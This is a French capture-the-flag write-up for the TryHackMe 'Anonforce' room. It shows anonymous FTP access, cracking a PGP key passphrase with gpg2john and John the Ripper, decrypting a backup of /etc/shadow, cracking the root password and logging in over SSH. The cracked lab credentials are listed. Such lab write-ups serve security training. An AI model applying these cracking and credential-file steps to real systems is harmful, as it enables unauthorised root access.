
---

## Write-up – Exploitation du service FTP anonyme sur Anonforce (Try Hack Me)

### Informations de base

**Adresse IP cible** : `10.10.137.215`  
**Ports ouverts** :
- **21/tcp** : FTP (vsftpd 3.0.3) – accès anonyme autorisé
- **22/tcp** : SSH (OpenSSH 7.2p2)

---

### 1. Connexion FTP anonyme

Connexion au service FTP avec l’utilisateur `ftp`, sans mot de passe.  
Accès direct à l’arborescence du système avec possibilité de lire certains fichiers sensibles.

Un répertoire nommé **`notread`** attire l’attention. Il contient deux fichiers :
- `private_key.pgp`
- `backup.pgp`

---

### 2. Récupération et analyse de la clé PGP

Les deux fichiers sont téléchargés localement.  
Extraction du hash de la clé privée avec `gpg2john` :

```bash
~/john/gpg2john private_key.pgp > hash.txt
~/john/run/john --wordlist=~/kali-wordlist/rockyou.txt hash.txt
```

Le mot de passe trouvé est :

```
xbox360
```

---

### 3. Déchiffrement de `backup.pgp`

Importation de la clé privée :

```bash
gpg --import ~/private.asc
```

Déchiffrement du fichier :

```bash
gpg --decrypt ~/backup.pgp
```

Le contenu du fichier correspond à **`/etc/shadow`**.

---

### 4. Crackage des mots de passe Linux

Récupération du fichier **`/etc/passwd`** (disponible via FTP également).  
Fusion des deux fichiers avec `unshadow` :

```bash
./john/run/unshadow passwd shadow.txt > unshadow.txt
```

Crackage avec `john` :

```bash
john --wordlist=~/kali-wordlists/rockyou.txt unshadow.txt
```

Mot de passe root récupéré :

```
root : hikari
```

---

### 5. Connexion SSH et récupération du flag

Connexion SSH en tant que root :

```bash
ssh root@10.10.137.215
```

Lecture du flag :

```bash
cat /root/root.txt
```

---

### Résumé des credentials

| Utilisateur | Mot de passe |
|-------------|--------------|
| Clé PGP     | xbox360      |
| root (SSH)  | hikari       |

---

### Notes complémentaires

**Scan Nmap** :

- FTP anonyme autorisé
- Système Linux avec noyau 5.4
- Possibilité de parcourir une grande partie du système de fichiers via FTP

---
